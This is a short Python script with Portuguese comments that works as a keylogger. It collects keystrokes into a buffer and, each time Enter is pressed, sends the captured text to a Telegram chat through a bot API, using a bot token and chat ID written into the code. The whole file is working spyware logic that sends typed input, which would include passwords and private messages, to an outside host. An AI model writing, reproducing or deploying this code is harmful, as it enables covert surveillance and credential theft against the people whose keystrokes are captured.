import requests

TOKEN = "8985026239:AAFluyNrfR6x6tU6YnmzSdDA1fOtMiHAeYg"
CHAT_ID = "-1004356233671"

buffer = ""

def on_press(key):
    global buffer
    try:
        # Se for uma tecla comum, adiciona ao buffer
        buffer += key.char
    except AttributeError:
        # Se for tecla especial
        if key == key.space:
            buffer += " "
        elif key == key.enter:
            send_to_telegram(buffer) # Envia o bloco completo
            buffer = "" # Limpa o buffer
        elif key == key.backspace:
            buffer = buffer[:-1] # Remove a última letra
        elif key == key.tab:
            buffer += " [TAB] "

def send_to_telegram(text):
    if text.strip(): # Evita enviar mensagens vazias
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": text}
        try:
            requests.post(url, data=payload)
        except Exception as e:
            print(f"Erro ao enviar: {e}")
